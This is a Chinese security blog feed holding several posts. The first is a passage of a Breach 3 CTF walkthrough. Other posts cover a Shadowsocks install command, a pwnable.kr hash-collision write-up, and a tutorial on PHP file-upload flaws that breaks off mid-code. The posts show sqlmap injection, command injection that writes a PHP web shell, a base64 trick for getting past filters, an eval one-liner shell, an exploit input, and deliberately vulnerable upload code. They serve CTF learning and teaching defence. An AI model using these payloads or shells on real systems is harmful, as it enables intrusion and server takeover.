href="https://www.cnblogs.com/wsjhk/p/5508051.html">https://www.cnblogs.com/wsjhk/p/5508051.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install knockd<br></code></pre></td></tr></table></figure><p>而上文中跟敲门序列最相近的就是email后面的数字了，因此：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">knock 192.168.229.129 545 232 1876<br></code></pre></td></tr></table></figure><p>命令执行无任何回显,此时在扫一下TCP端口发现多了很多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Scanning 192.168.229.129 [1000 ports]<br>Discovered open port 23/tcp on 192.168.229.129<br>Discovered open port 22/tcp on 192.168.229.129<br>Discovered open port 10010/tcp on 192.168.229.129<br>Discovered open port 5800/tcp on 192.168.229.129<br>Discovered open port 2048/tcp on 192.168.229.129<br>Discovered open port 10009/tcp on 192.168.229.129<br></code></pre></td></tr></table></figure><p>看到telnet，先连一下试试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  ~  telnet 192.168.229.129      <br>Trying 192.168.229.129...<br>Connected to 192.168.229.129.<br>Escape character is <span class="hljs-string">&#x27;^]&#x27;</span>.<br>I used to have a backdoor here but they closed it down around when they moved my desk into the basement.<br>Connection closed by foreign host.<br></code></pre></td></tr></table></figure><p>“以前这里有后门，但当他们把我的桌子搬到地下室时，他们把它关上了。”<br>没什么思路，继续练一下ssh试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"> ~  ssh root@192.168.229.129<br>**********************************************************************<br>*                                                                    * <br>*          The Bobs Cloud Hosting, LLC. Secure Backdoor              *<br>*                                                                    * <br>*                                                                    *<br>*  If you wish to discuss cloud hosting options, give us a call at   *<br>*                                                                    *<br>*   555-423-1800 or email us at thebobs@thebobscloudhostingllc.net   *<br>*                                                                    * <br>**********************************************************************<br><br>root@192.168.229.129<span class="hljs-string">&#x27;s password:</span><br></code></pre></td></tr></table></figure><p>不知道密码，在这里卡了一段时间，最后突然发现这个knock序列跟刚才不一样，重新敲下门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">knock 192.168.229.129 555 423 1800<br></code></pre></td></tr></table></figure><p>重新看一下开放的端口发现多了个8的TCP端口，服务是apache-httpd于是尝试从浏览器访问，发现此网站需要身份认证，账户密码在同系列挑战中的前两个挑战中留下了账号密码的信息：<strong>milton|thelaststraw</strong>，用此账户名密码登陆后看到如下界面：</p><p><img src="https://i.loli.net/2018/09/21/5ba447919903c.png"></p><p>发现一个待办事项表，而且这个上面提到了“掠夺他们所有的数据库”，点击下方的链接就来到了一个貌似是网站后台的登陆界面：</p><p><img src="https://i.loli.net/2018/09/21/5ba451dba7bab.png"></p><p>结合前面的提示，这明显是一个注入页面，于是Sqlmap启动，这是一个POST注入，我截获的部分Http头内容如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.229.129:8/breach3/index.php<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>47<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=nigh3kqnonu8co9frhn9fa6rh6<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic bWlsdG9uOnRoZWxhc3RzdHJhdw==<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br>username=test&amp;password=asdasdasd&amp;submit=+Login+<br></code></pre></td></tr></table></figure><p>所以命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.229.129:8/breach3/index.php&quot;</span> --dbms=mysql --auth-type=basic --auth-cred=milton:thelaststraw --level=3 --risk=3 --data=<span class="hljs-string">&quot;username=me&amp;password=me&amp;submit=+Login+&quot;</span> -p password  -D thebobs --dump<br></code></pre></td></tr></table></figure><p>得到的结果是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Database: thebobs<br>Table: login<br>[1 entry]<br>+----+----------+------------------------------------------+<br>| <span class="hljs-built_in">id</span> | username | password                                 |<br>+----+----------+------------------------------------------+<br>| 1  | admin    | 8f4fadb24304d60d9dcb1589aa6a5c2d2d373229 |<br>+----+----------+------------------------------------------+<br></code></pre></td></tr></table></figure><p>利用此账号密码进行登陆</p><p>进入管理界面，并发现了更多的页面：</p><p><img src="https://i.loli.net/2018/09/21/5ba4678cbd09e.png"></p><p><code>http://192.168.229.129:8/breach3/initechnetmonitor.php</code>页面的内容：</p><p><img src="https://i.loli.net/2018/09/21/5ba467d7c93b6.png"></p><p>这里显示了这台主机的网络信息，这里可以看到<code>ICMP</code>服务是关闭的，也就是直接去<code>ping</code>这台服务器是<code>ping</code>不同的，这里我就很好奇既然<code>ping</code>不通那么我第一步做主机<code>ping</code>扫描的时候<code>nmap</code>是怎么识别出这台主机的？</p><p>既然游客这么多的页面，而且貌似没有更深的目录了，因此<code>AppScan</code>启动，扫描结果为该网站存在命令执行漏洞，此处试了一下把一句话<code>echo</code>到<code>txt</code>中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.229.129:8/breach3/thebobscloudhostingllc/livechat.php?searcher=echo &#x27;&lt;?php echo shell_exec($_GET[&#x27;e&#x27;]); ?&gt;&#x27; &gt;test.txt<br></code></pre></td></tr></table></figure><p>此时发现test.txt中已经将一句话写入成功了</p><p><img src="https://i.loli.net/2018/09/21/5ba4e6b842cd6.png"></p><p>接下来怎么办呢，当然是写小马了，于是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.229.129:8/breach3/thebobscloudhostingllc/livechat.php?searcher=echo &#x27;&lt;?php echo shell_exec($_GET[&#x27;e&#x27;]); ?&gt;&#x27; &gt;shell.php<br></code></pre></td></tr></table></figure><p>此时试试我们的小马能不能用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.229.129:8/breach3/thebobscloudhostingllc/shell.php?e=ls<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/09/21/5ba4e76494ede.png"></p><p>执行成功，完美，其实这里有个小技巧，因为直接以铭文的方式写shell的话如果有waf或者某些过滤语句可能会把语句中的部分符号或者命令给过滤掉，因此可以采用先baseEncode后baseDecode的方式写shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">☁  ~  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php echo shell_exec($_GET[&#x27;</span>e<span class="hljs-string">&#x27;]); ?&gt;&#x27;</span> | base64<br>PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUW2VdKTsgPz4K<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://192.168.229.129:8/breach3/thebobscloudhostingllc/livechat.php?searcher=echo PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUW2VdKTsgPz4K | base64 -d &gt; shell.php<br></code></pre></td></tr></table></figure><p>这种方式可以保证写的东西不被过滤掉。</p><p>做到这里就可以试试查看一下各种文件了，但是文件很多，一般来说出题人都会把重要的文件放在home、tmp等文件夹中，查看一下：</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一键搭建ShadowSocks</title>
    <link href="/2018/09/%E4%B8%80%E9%94%AE%E6%90%AD%E5%BB%BAShadowSocks/"/>
    <url>/2018/09/%E4%B8%80%E9%94%AE%E6%90%AD%E5%BB%BAShadowSocks/</url>
    
    <content type="html"><![CDATA[<p>一键搭建<code>ss</code>，只可意会不可言传，嘘~~</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget –no-check-certificate -O shadowsocks.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>VPN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VPN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>col_WriteUp(panable.kr_col)hash碰撞</title>
    <link href="/2018/09/col-WriteUp-panable-kr-col-hash%E7%A2%B0%E6%92%9E/"/>
    <url>/2018/09/col-WriteUp-panable-kr-col-hash%E7%A2%B0%E6%92%9E/</url>
    
    <content type="html"><![CDATA[<p>题目传送门：<a href="http://pwnable.kr/play.php">http://pwnable.kr/play.php</a></p><p><img src="https://s1.ax1x.com/2018/07/13/PK82GT.png" alt="PK82GT.png"></p><p>ssh连接目标服务器得到三个文件，查看col.c内容如下：</p><p><img src="https://s1.ax1x.com/2018/07/13/PK8giV.png" alt="PK8giV.png"></p><span id="more"></span><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> hashcode = <span class="hljs-number">0x21DD09EC</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">check_password</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* p)</span>&#123;<br><span class="hljs-type">int</span>* ip = (<span class="hljs-type">int</span>*)p;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++)&#123;<br>res += ip[i];<br>&#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span>&#123;<br><span class="hljs-keyword">if</span>(argc&lt;<span class="hljs-number">2</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]) != <span class="hljs-number">20</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;passcode length should be 20 bytes\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(hashcode == check_password( argv[<span class="hljs-number">1</span>] ))&#123;<br>system(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong passcode.\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这道题的考点是hash碰撞，但是这个hash并非真的hash函数加密的hash，而是出题人指定的hash值：0x21DD09EC</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">check_password</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* p)</span>&#123;<br><span class="hljs-type">int</span>* ip = (<span class="hljs-type">int</span>*)p;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++)&#123;<br>res += ip[i];<br>&#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>此函数将用户输入的20个字节的数据作为5个字符串的值相加，最后在<code>if(hashcode == check_password( argv[1] ))</code>中与hash值对比，如果值相等则执行system(“&#x2F;bin&#x2F;cat flag”)输出flag，因此我们需要将输入的5个数相加的值为0x21DD09EC，因此可以将输入的20个字节的前16个字节输入为“\x00”，这里有必要提一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">col@ubuntu:~$ file col<br>col: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=05a10e253161f02d8e6553d95018bc82c7b531fe, not stripped<br></code></pre></td></tr></table></figure><p>本程序是x86程序，在内存中采用小端序，输入的顺序和在内存中存储的顺序是相反的，例如我们想存储\x00\x01则我们要输入\x01\x00，而没四个字节为一组，因此我们要想这5个数相加的值为0x21DD09EC我们可以输入4个”\x00\x00\x00\x00”+”\xEC\x09\xDD\21”,但是由于“0x09”有特殊含义，是一个坏字符（badchar），因此需要避开这个数字，我们可以构造4个”\x01\x01\x01\x01”和一个”\xE8\x05\xD9\x1D”</p><p><code>0x1DD905E8=0x21DD09EC-0x01010101-0x01010110-0x01010101-0x01010101</code></p><p>运行程序输入.&#x2F;col `python -c “print ‘\x01’ * 16 + ‘\xE8\x05\xD9\x1D’”`即可获取flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">col@ubuntu:~$ ./col `python -c <span class="hljs-string">&quot;print &#x27;\x01&#x27; * 16 + &#x27;\xE8\x05\xD9\x1D&#x27;&quot;</span>`<br>daddy! I just managed to create a <span class="hljs-built_in">hash</span> collision :)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP文件上传漏洞原理以及防御姿势</title>
    <link href="/2018/09/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1%E5%A7%BF%E5%8A%BF/"/>
    <url>/2018/09/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1%E5%A7%BF%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<p>本文用到的代码地址：<a href="https://github.com/Levones/PHP_file_upload_vlun%EF%BC%8C%E5%A5%BD%E8%AF%84%E8%AF%B7%E7%BB%99%E5%B0%8F%E6%98%9F%E6%98%9F%EF%BC%8C%E8%B0%A2%E8%B0%A2%E5%90%84%E4%BD%8D%E5%A4%A7%E4%BD%AC%EF%BC%81">https://github.com/Levones/PHP_file_upload_vlun，好评请给小星星，谢谢各位大佬！</a></p><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00  漏洞描述"></a>0x00  漏洞描述</h2><p>在实际开发过程中文件上传的功能时十分常见的，比如博客系统用户需要文件上传功能来上传自己的头像，写博客时需要上传图片来丰富自己的文章，购物系统在识图搜索时也需要上传图片等，文件上传功能固然重要，但是如果在实现相应功能时没有注意安全保护措施，造成的损失可能十分巨大，为了学习和研究文件上传功能的安全实现方法，我将在下文分析一些常见的文件上传安全措施和一些绕过方法。</p><p>我按照最常见的上传功能–上传图片来分析这个漏洞。为了使漏洞的危害性呈现的清晰明了，我将漏洞防御措施划分为几个不同的等级来作比较</p><span id="more"></span><h2 id="0x01-前端HTML页面代码"><a href="#0x01-前端HTML页面代码" class="headerlink" title="0x01  前端HTML页面代码"></a>0x01  前端HTML页面代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>&lt;title&gt;<br>    file_upload_test<br>&lt;/title&gt;<br>&lt;body&gt;<br>&lt;form enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> action=<span class="hljs-string">&quot;upload_1.php&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> /&gt;<br>&lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="hljs-string">&quot;100000&quot;</span> /&gt;<br>选择你要上传的图片:<br>&lt;br /&gt;<br>&lt;input name=<span class="hljs-string">&quot;uploaded&quot;</span> type=<span class="hljs-string">&quot;file&quot;</span> /&gt;&lt;br /&gt;<br>&lt;br /&gt;<br>&lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;Upload&quot;</span> value=<span class="hljs-string">&quot;上传&quot;</span> /&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>前端的实现代码均为以上。界面如下图：</p><p><img src="https://s1.ax1x.com/2018/06/10/Cq0S4e.png" alt="Cq0S4e.png"></p><h2 id="0x01-零防御的PHP上传代码"><a href="#0x01-零防御的PHP上传代码" class="headerlink" title="0x01  零防御的PHP上传代码"></a>0x01  零防御的PHP上传代码</h2><p><strong>源代码 upload_0.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Upload&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$target_path</span> = <span class="hljs-string">&quot;uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> = <span class="hljs-variable">$target_path</span> . <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$target_path</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;您的图片上传失败.&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$target_path</span> . <span class="hljs-string">&#x27;文件已经成功上传！&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段PHP代码对上传的文件没有任何的过滤，只是将上传的文件直接存储到了网站uploads文件夹下，此时如果我们上传一个一句话木马并通过浏览器访问加上参数的地址或者使用中国菜刀直接连接，就可以为所欲为了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//一句话木马</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="0x01-初级防护-验证文件类型"><a href="#0x01-初级防护-验证文件类型" class="headerlink" title="0x01  初级防护-验证文件类型"></a>0x01  初级防护-验证文件类型</h2><p><strong>源代码 upload_1.php</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br><span class="hljs-variable">$target_path</span>  = <span class="hljs-string">&quot;uploads/&quot;</span>;<br><span class="hljs-variable">$target_path</span> .= <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><span class="hljs-comment">//识别文件类型</span><br><span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br><span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];<br><span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br><span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/jpeg&quot;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/png&quot;</span> ) &amp;&amp;<br>( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) ) &#123;<br><span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ], <span class="hljs-variable">$target_path</span> ) ) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;图片上传失败&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> 图片上传成功！&lt;/pre&gt;&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;只允许上传jpg或者png格式的图片文件,且文件大小不能超过100k&lt;/pre&gt;&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>防御方法</strong></p><p>初级防御的代码在审查用户上传的文件时加入了“Content-Type”验证，代码会自动识别文件类型并将文件类型以表单的形式进行验证，如果“Content-Type”是image&#x2F;jpeg或者image&#x2F;png时文件可以上传 成功，算是初级防御。</p><p><strong>绕过方法</strong></p><p>用BurpSuite截断代理修改数据包的相关字段即可完成绕过，本例上传的文件时shell.php，代码会将此文件的Content-Type识别为application&#x2F;x-php，直接将application&#x2F;x-php改为mage&#x2F;jpeg即可绕过验证，而且对于文件大小的限制也是可以直接修改”MAX_FILE_SIZE”的方式突破限制从而上传更大的文件。</p><p><strong>修改前</strong><img src="https://s1.ax1x.com/2018/06/10/Cq099H.png" alt="Cq099H.png"></p><p><strong>修改后</strong></p><p><img src="https://s1.ax1x.com/2018/06/10/Cq0C3d.png" alt="Cq0C3d.png"></p><p><img src="https://s1.ax1x.com/2018/06/10/Cq03D0.png" alt="Cq03D0.png"></p><h2 id="0x02-一般防护-验证文件后缀"><a href="#0x02-一般防护-验证文件后缀" class="headerlink" title="0x02  一般防护-验证文件后缀"></a>0x02  一般防护-验证文件后缀</h2><p><strong>源代码 upoad_2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br><span class="hljs-variable">$target_path</span>  = <span class="hljs-string">&quot;uploads/&quot;</span>;<br><span class="hljs-variable">$target_path</span> .= <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><span class="hljs-comment">//记录文件信息</span><br><span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br><span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ 